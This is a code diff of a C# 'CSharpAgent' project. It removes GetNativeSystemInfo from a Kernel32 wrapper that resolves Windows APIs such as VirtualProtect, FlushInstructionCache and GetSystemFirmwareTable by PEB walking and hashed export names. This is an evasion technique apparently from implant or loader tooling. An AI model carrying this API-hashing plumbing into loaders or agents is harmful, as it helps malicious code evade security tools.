@@ -24,7 +24,6 @@ namespace CSharpAgent
         private Kernel32(
             IntPtr moduleHandle,
             ChangeMemoryProtectionDelegate changeMemoryProtection,
-            GetNativeSystemInfoDelegate getNativeSystemInfo,
             GetProcAddressDelegate getProcAddress,
             FlushInstructionCacheDelegate flushInstructionCache,
             GetSystemFirmwareTableDelegate getSystemFirmwareTable,
@@ -32,7 +31,6 @@ namespace CSharpAgent
         {
             ModuleHandle = moduleHandle;
             ChangeMemoryProtection = changeMemoryProtection;
-            GetNativeSystemInfo = getNativeSystemInfo;
             GetProcAddress = getProcAddress;
             FlushInstructionCache = flushInstructionCache;
             GetSystemFirmwareTable = getSystemFirmwareTable;
@@ -54,14 +52,12 @@ namespace CSharpAgent
             }
 
             IntPtr ptrVirtualProtect         = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("VirtualProtect"));
-            IntPtr ptrGetNativeSystemInfo  = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetNativeSystemInfo"));
             IntPtr ptrGetProcAddress       = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetProcAddress"));
             IntPtr ptrFlushInstructionCache = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("FlushInstructionCache"));
             IntPtr ptrGetSystemFirmwareTable = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetSystemFirmwareTable"));
             IntPtr ptrLoadLibraryW = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("LoadLibraryW"));
 
             if (ptrVirtualProtect == IntPtr.Zero || 
-                ptrGetNativeSystemInfo == IntPtr.Zero || 
                 ptrGetProcAddress == IntPtr.Zero || 
                 ptrFlushInstructionCache == IntPtr.Zero ||
                 ptrGetSystemFirmwareTable == IntPtr.Zero ||
@@ -73,8 +69,6 @@ namespace CSharpAgent
             // Non-generic Marshal.GetDelegateForFunctionPointer for .NET 2.0 compatibility
             var changeMemoryProtection = (ChangeMemoryProtectionDelegate)Marshal.GetDelegateForFunctionPointer(
                 ptrVirtualProtect, typeof(ChangeMemoryProtectionDelegate));
-            var getNativeSystemInfo = (GetNativeSystemInfoDelegate)Marshal.GetDelegateForFunctionPointer(
-                ptrGetNativeSystemInfo, typeof(GetNativeSystemInfoDelegate));
             var getProcAddress = (GetProcAddressDelegate)Marshal.GetDelegateForFunctionPointer(
                 ptrGetProcAddress, typeof(GetProcAddressDelegate));
             var flushInstructionCache = (FlushInstructionCacheDelegate)Marshal.GetDelegateForFunctionPointer(
@@ -89,7 +83,6 @@ namespace CSharpAgent
             instance = new Kernel32(
                 moduleHandle,
                 changeMemoryProtection,
-                getNativeSystemInfo,
                 getProcAddress,
                 flushInstructionCache,
                 getSystemFirmwareTable,
